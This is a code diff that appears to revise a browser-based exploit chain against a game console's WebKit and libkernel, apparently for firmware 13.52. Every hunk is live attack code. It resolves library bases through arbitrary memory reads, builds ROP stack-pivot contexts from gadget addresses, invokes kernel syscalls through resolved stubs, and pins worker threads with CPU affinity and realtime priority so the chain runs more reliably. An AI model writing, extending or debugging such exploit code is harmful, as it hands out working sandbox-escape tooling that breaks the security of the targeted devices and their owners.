@@ -131,7 +131,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "chain_1352-2026-03-26b";
+const CHAIN_BUILD = "chain_1352-2026-03-26c-poc";
 
 (async function () {
     let p = null;
@@ -369,13 +369,13 @@ const CHAIN_BUILD = "chain_1352-2026-03-26b";
         const webkitBase = MEASURED.webkit
             || nativeFn.sub32(off.wk_expm1_builtin);
         let errorFn = null;
-        if (MEASURED.libkernel && off.k__error)
-            errorFn = MEASURED.libkernel.add32(off.k__error);
-        if (!errorFn && off.wk___imp___error) {
+        if (off.wk___imp___error) {
             try { errorFn = p.read8(webkitBase.add32(off.wk___imp___error)); } catch (_) { }
         }
         const libkernelBase = MEASURED.libkernel
             || (errorFn ? errorFn.sub32(off.k__error) : null);
+        if (libkernelBase && off.k__error)
+            errorFn = libkernelBase.add32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
             + (MEASURED.webkit ? " (measured)" : "")
             + (MEASURED.libkernel ? " (measured)" : ""));
@@ -453,20 +453,24 @@ const CHAIN_BUILD = "chain_1352-2026-03-26b";
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
+                if (!v || typeof v.low !== "number" || typeof v.hi !== "number")
+                    throw new Error("put: bad int64 at 0x" + at.toString(16));
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
         }
         const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
-        function makeCtx() {
+        function makeCtx(retain) {
             const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
             const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
-            keepAlive.push(sb, pb, kb, fb);
             const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                 stackDv: new DataView(kb), frameDv: new DataView(fb),
                 stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
-            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
-                c.stackU8, c.frameU8);
+            if (retain !== false) {
+                keepAlive.push(sb, pb, kb, fb);
+                keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
+                    c.stackU8, c.frameU8);
+            }
             c.S = bufAddr(sb); c.P = bufAddr(pb);
             c.K = bufAddr(kb); c.F = bufAddr(fb);
             put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
@@ -510,7 +514,12 @@ const CHAIN_BUILD = "chain_1352-2026-03-26b";
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+        const sc = (num, ...a) => {
+            const stub = stubAddr.get(num);
+            if (!stub)
+                throw new Error("missing syscall stub num=0x" + (num >>> 0).toString(16));
+            return callAddr(stub, a);
+        };
         function errno() {
             if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
@@ -1491,7 +1500,9 @@ const CHAIN_BUILD = "chain_1352-2026-03-26b";
             await w.rpc("setup", 15000, wl.low, wl.hi);
             await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
             w.armed = true;
-            w.ctx = makeCtx();
+            w.ctx = makeCtx(false);
+            await new Promise(r => setTimeout(r, 0));
+            sc(SYS.sched_yield);
         }
         check("worker-came-arw",
             workers.length === TOTAL_WORKERS,
@@ -1597,9 +1608,16 @@ const CHAIN_BUILD = "chain_1352-2026-03-26b";
             return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
         }
+        // Worker pin burst OOMs on 13.52 if the heap cannot sweep — yield between fires.
+        await new Promise(r => setTimeout(r, 0));
+        sc(SYS.sched_yield);
         for (const w of workers) {
+            await new Promise(r => setTimeout(r, 0));
+            sc(SYS.sched_yield);
             await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
+            await new Promise(r => setTimeout(r, 0));
+            sc(SYS.sched_yield);
             await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
         }
         mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
